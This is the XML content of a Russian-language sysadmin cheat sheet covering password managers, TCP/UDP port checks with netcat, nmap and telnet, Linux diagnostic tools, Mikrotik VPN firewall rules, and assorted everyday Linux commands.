      <text:p text:style-name="P1"><text:span text:style-name="T1">KeeWeb (https://t.me/KladovkaPavlu/278) - бесплатный кросс-платформенный менеджер паролей, совместимый с KeePass.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Bitwarden (https://t.me/KladovkaPavlu/210)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span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">stash (https://t.me/KladovkaPavlu/1237) - <text:s/>это консольная программа/зашифрованное текстовое хранилище для пользователей Linux и Mac.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверяем доступность портов с использованием nmap/netcat/telnet/nc</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Доступность</text:span><text:span text:style-name="T3"> tcp-</text:span><text:span text:style-name="T1">порта</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat [options] host port</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">сканер</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">портов</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat -z -v domain.com 1-1000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">запустить netcat на хосте и слушать на tcp порте 4444:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">netcat -l 4444</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">а на другой машине проверить подключение к netcat, запущенному на другом хосте:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat domain.com 4444</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nc -vt &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">telnet</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">telnet &lt;ip&gt; &lt;port&gt;</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">nmap</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">порт</text:span><text:span text:style-name="T3"> 25 tcp: nmap -p25 11.11.11.11</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Доступность</text:span><text:span text:style-name="T3"> udp-</text:span><text:span text:style-name="T1">порта</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">netcat -u host port</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nc</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">nc -vu &lt;ip&gt; &lt;port&gt;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">nmap</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">доступность порта udp 53: nmap -sU -p U:53 11.1.11.12</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Стандартные инструменты для диагностики системы Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ядро:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* ftrace - трассировщик вызовов функций внутри ядра Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">* stap - скриптовый язык и инструмент для комплексной диагностики ядра и процессов Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* lttng - (Linux Trace Toolkit Next Generation) инструмент для трассировки ядра, программ и библиотек Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">*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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Ввод/вывод:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* iostat (sysstat) - статистика ввода/вывода по заданному устройству (количество операций записи/чтения в единицу времени, скорость записи/чтения)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* pidstat (sysstat) - нагрузка на процессор, память и устройства от конкретного процесса (заданного по имени или номеру)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* pcstat - использование кэша (какой процент файла попадает в кэш, какой нет)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* lsof - информация об открытых процессом файлах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">blktrace</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Системные и библиотечные вызовы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* ltrace - трассировка библиотечных вызовов (которые не обязательно являются системными)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Аппаратные счётчики:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* tiptop - информация о процессах в реальном времени, похожа на top, но в отличие от него данные преимущественно берутся с аппаратных счётчиков</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* numastat - просмотр информации об использовании памяти процессами/процессорами в системах с NUMA-архитектурой</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Сеть:</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">* netstat - классический инструмент для просмотра конфигурации сети (сокетов, интерфейсов и так далее)</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">* ss - socket statistics, позволяет получить информацию об открытых сокетах и их состоянии (похожа на netstat, но умеет больше)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* ethtool - просмотр настроек и состояния ethernet-интерфейса</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* snmpget - получение данных по SNMP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* lldptool - настройка LLDP и просмотр данных LLDP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* nicstat - статистика использования сетевой карты (сетевого интерфейса)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* ip - конфигурация и статистика стека TCP/IP Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* ifstat - статистика использования сетевого интерфейса в реальном времени</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Процессы:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* top - информация о наиболее активных (наиболее ресурсоёмки) процессах + общая информация о системе</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* vmstat - данные об использовании виртуальной памяти</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* free - информация о свободной памяти, кэше, буферах</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">* slabtop - информация о заполнении SLAB-кэша</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Процессор:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* mpstat (sysstat) - общая информация об использовании процессора (одного или всех процессоров)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* turbostat (kernel-tools) - информация о топологии процессора, частоте, питании, температуре</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* rdmsr - (Read from Model Specific Register) чтение из моделезависимых регистров (позволяет оценить использование LLC-кэша и прочее)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Универсальные:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* sar - (system activity report) информация о системной активности в реальном времени (диск, память, процессор и так далее)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* dstat - универсальный инструмент для сбора информации о системе (vmstat, iostat, netstat, ifstat и ещё много других в одном флаконе)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* dmesg - журнал сообщений ядра с момента загрузки системы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">* /proc - псевдофайловая система, предоставляющая доступ к внутренним данным/счётчикам ядра</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">* sysdig - универсальный инструмент для сбора и анализа данных о системе (сотни различных источников скомбинированные вместе)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Шпаргалка по фаерволу Mikrotik, пропускаем VPN соединения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Разрешить весь VPN-трафик через VPN-соединения:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Надо учитывать, что некоторые виды подключения, например GRE не являются PPP.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add chain=forward comment="Permit all PPP" in-interface=all-ppp</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> PPTP-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add chain=input dst-port=1723 protocol=tcp comment="Permit PPTP"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> L2TP-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add chain=input dst-port=1701 protocol=udp comment="Permit L2TP"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> IPSec-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add chain=input port=500,4500 protocol=udp comment="Permit IPSec ports 500 and 4500"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add chain=input protocol=ipsec-esp comment="Permit IPSec protocol ipsec-esp"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> OpenVPN-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=accept chain=input dst-port=1194 protocol=tcp comment="Permit OpenVPN"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> SSTP-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">add action=accept chain=input dst-port=443 protocol=tcp comment="Permit SSTP"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> GRE-</text:span><text:span text:style-name="T1">подключение</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=accept chain=input protocol=gre comment="Permit GRE"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T1">Разрешить</text:span><text:span text:style-name="T3"> IPIP-</text:span><text:span text:style-name="T1">подключение</text:span><text:span text:style-name="T3">: /ip firewall filter</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=accept chain=input protocol=ipip comment="Permit IPIP"</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Включить Fast Track можно следующим образом:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall filter add chain=forward action=fasttrack-connection connection-state=established,related</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как результат появляется недостаток: соединения IPsec так же не будут обработаны. Решить эту проблему можно следующим образом.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вначале надо пометить соединения IPsec:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">/ip firewall mangle</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=out,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">add action=mark-connection chain=forward comment="Mark IPsec" ipsec-policy=in,ipsec new-connection-mark=ipsec</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Далее изменить стандартное правило Fast Track так, что бы оно не обрабатывало пакеты IPsec. Изменения внесенные в стандартное правило выделены красным.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">/ip firewall filter add action=fasttrack-connection chain=forward comment=FastTrack</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">connection-mark=!ipsec connection-state=established,related</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Топ полезных команд</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отправить тестовое письмо: </text:span><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">test</text:span><text:span text:style-name="T1">" | </text:span><text:span text:style-name="T3">mail</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">s</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">Test</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Subject</text:span><text:span text:style-name="T1">" </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">@</text:span><text:span text:style-name="T3">gmail</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выполнить </text:span><text:span text:style-name="T3">PHP</text:span><text:span text:style-name="T1"> функцию в консоли: </text:span><text:span text:style-name="T3">php</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">r</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">phpinfo</text:span><text:span text:style-name="T1">();" | </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">date</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">timezone</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Отключить спящий режим на </text:span><text:span text:style-name="T3">ubuntu</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">server</text:span><text:span text:style-name="T1">: </text:span><text:span text:style-name="T3">sudo</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">systemctl</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">mask</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">sleep</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">target</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">suspend</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">target</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">hibernate</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">target</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">hybrid</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">sleep</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">target</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T1">Для проверки набора переменных </text:span><text:span text:style-name="T3">BASH</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">ENV</text:span><text:span text:style-name="T1">: $ </text:span><text:span text:style-name="T3">env</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">grep</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">BASH</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">ENV</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Замер скорости диска:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dd if=/dev/zero of=testfile bs=4k count=1310720</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">dd if=testfile of=/dev/null bs=4k count=1310720</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Обновить locate: /usr/libexec/locate.updatedb</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Конвертировать HEIC в JPG: ls *.HEIC -1 | sed -e 's/\.HEIC$//' | xargs -I {} convert {}.HEIC {}.JPG</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Изменить текстовый редактор для конкретного случая: </text:span><text:span text:style-name="T3">export</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">EDITOR</text:span><text:span text:style-name="T1">=</text:span><text:span text:style-name="T3">ee</text:span><text:span text:style-name="T1">; </text:span><text:span text:style-name="T3">crontab</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">e</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Удалить snapd в Ubuntu Server:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ sudo apt purge snapd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ sudo apt-mark hold snapd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">snapd помечен как зафиксированный.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Удалить старые данные </text:span><text:span text:style-name="T3">telegraf</text:span><text:span text:style-name="T1"> в </text:span><text:span text:style-name="T3">Influxdb</text:span><text:span text:style-name="T1"> 1.8:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ docker exec -ti influxdb influx </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Connected to http://localhost:8086 version 1.8.10</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">InfluxDB shell version: 1.8.10</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">&gt; use telegraf;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Using database telegraf</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">&gt; DELETE WHERE time &lt; '2022-06-01'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">будут удалены все записи до 2022-06-01</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Работа с сетью. Изменением маршрута: </text:span><text:span text:style-name="T3">route</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">change</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">default</text:span><text:span text:style-name="T1"> 192.168.1.1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выключаем </text:span><text:span text:style-name="T3">IPv</text:span><text:span text:style-name="T1">6: </text:span><text:span text:style-name="T3">sudo</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">nano</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">conf</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">net.ipv6.conf.all.disable_ipv6 = 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">net.ipv6.conf.default.disable_ipv6 = 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">net.ipv6.conf.lo.disable_ipv6 = 1</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Информация о пользователях и системе в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whoami</text:span><text:span text:style-name="T1"> или </text:span><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> $</text:span><text:span text:style-name="T3">USER</text:span><text:span text:style-name="T1">- выведем имя юзера</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">groups</text:span><text:span text:style-name="T1"> - выведет группы пользователя</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">id</text:span><text:span text:style-name="T1"> - выведет </text:span><text:span text:style-name="T3">User</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">IDentifier</text:span><text:span text:style-name="T1">, его имя, </text:span><text:span text:style-name="T3">Group</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">IDentifier</text:span><text:span text:style-name="T1"> и группы данного юзера с их </text:span><text:span text:style-name="T3">GID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">(Обычно первая сотка/тысяча юзеров зарезервирована для системных)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">passwd</text:span><text:span text:style-name="T1"> записываются </text:span><text:span text:style-name="T3">UIDs</text:span><text:span text:style-name="T1"> пользователей</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">В /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">groups</text:span><text:span text:style-name="T1"> записываются </text:span><text:span text:style-name="T3">GIDs</text:span><text:span text:style-name="T1"> пользователей</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - список последних логинов в систему</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">reboot</text:span><text:span text:style-name="T1"> - список перезагрузок хоста по времени</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">1 - отобразить историю регистрации пользователя в системе и время его нахождения в ней</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> - показывает активные сессии (дата, время, </text:span><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1">, простой, сколько было потреблено процессорного времени и что выполняет)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> $</text:span><text:span text:style-name="T3">XDG</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">CURRENT</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">DESKTOP</text:span><text:span text:style-name="T1"> - узнать какая графическая оболочка</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">hostname</text:span><text:span text:style-name="T1"> - выведет имя хоста, </text:span><text:span text:style-name="T3">hostname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1"> адреса</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">uname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - выводит ОС, версию ядра, архитектуру и дату сборки, процессор, лицензию и так далее, т.е. вся информация о системе, сборке или </text:span><text:soft-page-break/><text:span text:style-name="T3">lsb</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">release</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> или пакет </text:span><text:span text:style-name="T3">neofetch</text:span><text:span text:style-name="T1"> с полной информацией о системе или </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">os</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">release</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">dmidecode</text:span><text:span text:style-name="T1"> - информация о железе</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">free</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">t</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">mega</text:span><text:span text:style-name="T1"> - выводит данные об использовании ОЗУ и </text:span><text:span text:style-name="T3">swap</text:span><text:span text:style-name="T1"> в мегабайтах (поле </text:span><text:span text:style-name="T3">shared</text:span><text:span text:style-name="T1">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1" loext:marker-style-name="T2"><text:span text:style-name="T3">date</text:span><text:span text:style-name="T1"> - полная дата с часовым поясом</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ifconfig</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - Настройки всех сетевых адаптеров</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ip</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">addr</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">show</text:span><text:span text:style-name="T1"> - Список всех сетевых интерфейсов и связанных </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адресов</text:span></text:p>
